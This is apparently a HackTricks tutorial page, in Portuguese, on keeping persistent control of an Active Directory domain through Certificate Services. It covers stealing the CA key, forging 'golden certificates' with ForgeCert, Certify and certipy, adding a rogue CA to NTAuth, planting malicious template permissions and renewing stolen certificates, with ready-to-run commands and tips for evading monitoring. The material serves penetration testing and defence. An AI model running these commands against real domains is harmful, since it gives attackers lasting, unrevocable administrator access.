# Persistência de domínio do AD CS

{{#include ../../../banners/hacktricks-training.md}}

**Este é um resumo das técnicas de persistência de domínio compartilhadas em [https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)**. Consulte o documento para mais detalhes.<sup>[[5]](#references)</sup>

## Forjando certificados com certificados de CA roubados (Golden Certificate) - DPERSIST1

Como saber se um certificado é um certificado de CA?

É possível determinar que um certificado é um certificado de CA quando várias condições são atendidas:<sup>[[5]](#references)</sup>

- O certificado está armazenado no servidor da CA, com sua chave privada protegida pelo DPAPI da máquina ou por hardware, como um TPM/HSM, se o sistema operacional oferecer suporte.
- Os campos Issuer e Subject do certificado correspondem ao nome distinto da CA.
- Uma extensão "CA Version" está presente exclusivamente nos certificados de CA.
- O certificado não contém campos Extended Key Usage (EKU).

Para extrair a chave privada desse certificado, o método compatível é usar a ferramenta `certsrv.msc` no servidor da CA por meio da GUI integrada. No entanto, esse certificado não difere dos outros armazenados no sistema; portanto, métodos como a [técnica THEFT2](certificate-theft.md#user-certificate-theft-via-dpapi-theft2) podem ser usados para extraí-lo.

O certificado e a chave privada também podem ser obtidos usando Certipy com o seguinte comando:<sup>[[2]](#references)</sup>

```bash
certipy ca 'corp.local/administrator@ca.corp.local' -hashes :123123.. -backup
```

Após adquirir o certificado da CA e sua chave privada no formato `.pfx`, ferramentas como [ForgeCert](https://github.com/GhostPack/ForgeCert) podem ser utilizadas para gerar certificados válidos:

```bash
# Generating a new certificate with ForgeCert
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123! --Subject "CN=User" --SubjectAltName localadmin@theshire.local --NewCertPath localadmin.pfx --NewCertPassword Password123!

# Generating a new certificate with certipy
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'

# Authenticating using the new certificate with Rubeus
Rubeus.exe asktgt /user:localdomain /certificate:C:\ForgeCert\localadmin.pfx /password:Password123!

# Authenticating using the new certificate with certipy
certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128
```

> [!WARNING]
> O usuário alvo da falsificação de certificado deve estar ativo e ser capaz de se autenticar no Active Directory para que o processo funcione. Falsificar um certificado para contas especiais, como krbtgt, é ineficaz.

Este certificado falsificado será **válido** até a data de término especificada e enquanto o certificado da CA raiz for **válido** (geralmente de 5 a **mais de 10 anos**). Ele também é válido para **máquinas**, então, combinado com **S4U2Self**, um atacante pode **manter persistência em qualquer máquina do domínio** enquanto o certificado da CA for válido.\
Além disso, os **certificados gerados** com este método **não podem ser revogados**, pois a CA não tem conhecimento deles.

### Operando sob Strong Certificate Mapping Enforcement (2025+)

Desde 11 de fevereiro de 2025 (após a implementação do KB5014754), os controladores de domínio usam, por padrão, o modo **Full Enforcement** para mapeamentos de certificados. Na prática, isso significa que os certificados falsificados devem:

- Conter uma vinculação forte à conta alvo (por exemplo, a extensão de segurança SID), ou
- Ser combinados com um mapeamento forte e explícito no atributo `altSecurityIdentities` do objeto alvo.<sup>[[1]](#references)</sup>

Uma abordagem confiável para persistência é emitir um certificado falsificado encadeado à Enterprise CA roubada e, em seguida, adicionar um mapeamento forte e explícito à entidade principal vítima:

```powershell
# Example: map a forged cert to a target account using Issuer+Serial (strong mapping)
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'           # reverse DN format expected by AD
$SerialR = '1200000000AC11000000002B'                  # serial in reversed byte order
$Map     = "X509:<I>$Issuer<SR>$SerialR"             # strong mapping format
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```

Notas
- Se você conseguir criar certificados forjados que incluam a extensão de segurança SID, eles serão mapeados implicitamente mesmo com Full Enforcement. Caso contrário, prefira mapeamentos fortes explícitos. Consulte [account-persistence](account-persistence.md) para saber mais sobre mapeamentos explícitos.
- A revogação não ajuda os defensores neste caso: certificados forjados são desconhecidos para o banco de dados da CA e, portanto, não podem ser revogados.

#### Criação de certificados compatível com Full Enforcement (SID-aware)

As ferramentas atualizadas permitem incorporar o SID diretamente, mantendo os Golden Certificates utilizáveis mesmo quando os DCs rejeitam mapeamentos fracos:<sup>[[3]](#references)</sup>

```bash
# Certify 2.0 integrates ForgeCert and can embed SID
Certify.exe forge --ca-pfx CORP-DC-CA.pfx --ca-pass Password123! \
  --upn administrator@corp.local --sid S-1-5-21-1111111111-2222222222-3333333333-500 \
  --outfile administrator_sid.pfx

# Certipy also supports SID in forged certs
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local \
  -sid S-1-5-21-1111111111-2222222222-3333333333-500 -out administrator_sid.pfx
```

Ao incorporar o SID, você evita ter que alterar `altSecurityIdentities`, que pode ser monitorado, e ainda satisfaz as verificações rigorosas de mapeamento.

## Confiar em certificados de CA rogue - DPERSIST2

O objeto `NTAuthCertificates` foi definido para conter um ou mais **certificados de CA** no atributo `cacertificate`, utilizado pelo Active Directory (AD). O processo de verificação pela **controladora de domínio** envolve consultar o objeto `NTAuthCertificates` em busca de uma entrada correspondente à **CA especificada** no campo Issuer do **certificado** usado para autenticação. A autenticação prossegue se houver uma correspondência.<sup>[[5]](#references)</sup>

Um atacante pode adicionar um certificado de CA autoassinado ao objeto `NTAuthCertificates`, desde que tenha controle sobre esse objeto do AD. Normalmente, somente membros do grupo **Enterprise Admin**, além de **Domain Admins** ou **Administrators** no **domínio raiz da floresta**, têm permissão para modificar esse objeto. Eles podem editar o objeto `NTAuthCertificates` usando `certutil.exe` com o comando `certutil.exe -dspublish -f C:\Temp\CERT.crt NTAuthCA` ou usando a [**PKI Health Tool**](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/import-third-party-ca-to-enterprise-ntauth-store#method-1---import-a-certificate-by-using-the-pki-health-tool).

Outros comandos úteis para esta técnica:

```bash
# Add/remove and inspect the Enterprise NTAuth store
certutil -enterprise -f -AddStore NTAuth C:\Temp\CERT.crt
certutil -enterprise -viewstore NTAuth
certutil -enterprise -delstore NTAuth <Thumbprint>

# (Optional) publish into AD CA containers to improve chain building across the forest
certutil -dspublish -f C:\Temp\CERT.crt RootCA          # CN=Certification Authorities
certutil -dspublish -f C:\Temp\CERT.crt CA               # CN=AIA
```

Esta capacidade é especialmente relevante quando usada em conjunto com um método descrito anteriormente que envolve o ForgeCert para gerar certificados dinamicamente.

> Considerações de mapeamento pós-2025: adicionar uma CA maliciosa ao NTAuth estabelece apenas a confiança na CA emissora. Para usar certificados leaf no logon quando os DCs estão em **Full Enforcement**, o certificado leaf precisa conter a extensão de segurança SID ou deve haver um mapeamento explícito forte no objeto de destino (por exemplo, Issuer+Serial em `altSecurityIdentities`). Consulte {{#ref}}account-persistence.md{{#endref}}.

## Configuração incorreta maliciosa - DPERSIST3

Há muitas oportunidades de **persistence** por meio de **modificações de descritores de segurança** de componentes do AD CS. As modificações descritas na seção "[Domain Escalation](domain-escalation.md)" podem ser implementadas maliciosamente por um atacante com acesso elevado. Isso inclui adicionar "direitos de controle" (por exemplo, WriteOwner/WriteDACL/etc.) a componentes sensíveis, como:<sup>[[5]](#references)</sup>

- O objeto de **computador do AD do servidor da CA**
- O **servidor RPC/DCOM do servidor da CA**
- Qualquer **objeto ou contêiner descendente do AD** em **`CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`** (por exemplo, o contêiner Certificate Templates, o contêiner Certification Authorities, o objeto NTAuthCertificates etc.)
- **Grupos do AD aos quais a organização delegou explicitamente direitos de controle da CA ou dos templates**. O grupo interno Cert Publishers está autorizado a publicar certificados em objetos de usuário no AD; a associação ao grupo, por si só, não concede direitos de controle da CA ou dos templates nem direitos de inscrição. Verifique separadamente as permissões relevantes da CA e dos templates. Consulte [a descrição da Microsoft sobre o Cert Publishers](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers) e [as permissões de templates de certificado](https://learn.microsoft.com/en-us/intune/configmgr/protect/plan-design/planning-for-certificate-template-permissions).

Um exemplo de implementação maliciosa seria um atacante com **permissões elevadas** no domínio adicionar a permissão **`WriteOwner`** ao template de certificado padrão **`User`**, definindo o próprio atacante como principal dessa permissão. Para explorar isso, o atacante primeiro alteraria a propriedade do template **`User`** para si mesmo. Em seguida, definiria **`mspki-certificate-name-flag`** como **1** no template para habilitar **`ENROLLEE_SUPPLIES_SUBJECT`**, permitindo que um usuário forneça um Subject Alternative Name na solicitação. Depois, o atacante poderia se **inscrever** usando o **template**, escolher o nome de um **administrador do domínio** como nome alternativo e usar o certificado obtido para autenticar-se como DA.

Configurações que atacantes podem definir para manter a persistence do domínio a longo prazo (consulte {{#ref}}domain-escalation.md{{#endref}} para obter todos os detalhes e informações de detecção):

- Sinalizadores de política da CA que permitem SAN fornecido pelos solicitantes (por exemplo, habilitar `EDITF_ATTRIBUTESUBJECTALTNAME2`). Isso mantém exploráveis caminhos semelhantes a ESC1.
- DACL ou configurações de template que permitem a emissão de certificados capazes de autenticação (por exemplo, adicionar Client Authentication EKU, habilitar `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`).
- Controlar o objeto `NTAuthCertificates` ou os contêineres da CA para reintroduzir continuamente emissores maliciosos caso os defensores tentem removê-los.

> [!TIP]
> Em ambientes reforçados após a KB5014754, combinar essas configurações incorretas com mapeamentos fortes explícitos (`altSecurityIdentities`) garante que os certificados emitidos ou forjados continuem utilizáveis mesmo quando os DCs aplicarem o mapeamento forte.

### Abuso de renovação de certificado (ESC14) para persistence

Se você comprometer um certificado capaz de autenticação (ou um certificado de Enrollment Agent), poderá **renová-lo indefinidamente** enquanto o template emissor continuar publicado e sua CA ainda confiar na cadeia do emissor. A renovação mantém as vinculações de identidade originais, mas estende a validade, dificultando a remoção, a menos que o template seja corrigido ou a CA seja publicada novamente.<sup>[[4]](#references)</sup>

```bash
# Renew a stolen user cert to extend validity
certipy req -ca CORP-DC-CA -template User -pfx stolen_user.pfx -renew -out user_renewed_2026.pfx

# Renew an on-behalf-of cert issued via an Enrollment Agent
certipy req -ca CORP-DC-CA -on-behalf-of 'CORP/victim' -pfx agent.pfx -renew -out victim_renewed.pfx
```

Se os controladores de domínio estiverem em **Full Enforcement**, adicione `-sid <victim SID>` (ou use um template que ainda inclua a extensão de segurança SID) para que o certificado folha renovado continue sendo mapeado de forma forte, sem alterar `altSecurityIdentities`. Atacantes com direitos de administrador da CA também podem ajustar `policy\RenewalValidityPeriodUnits` para estender a validade dos certificados renovados antes de emitir um certificado para si mesmos.<sup>[[2]](#references)[[4]](#references)</sup>


## References

- [1] [Microsoft KB5014754 – Alterações na autenticação baseada em certificados nos controladores de domínio do Windows (cronograma de aplicação e mapeamentos fortes)](https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
- [2] [Certipy – Referência de comandos e uso de forge/auth](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference)
- [3] [SpecterOps – Certify 2.0 (forge integrado com suporte a SID)](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [4] [Visão geral do abuso de renovação ESC14](https://www.adcs-security.com/attacks/esc14)
- [5] [SpecterOps – Certificado de Origem: Abusando dos Serviços de Certificados do Active Directory](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)
{{#include ../../../banners/hacktricks-training.md}}
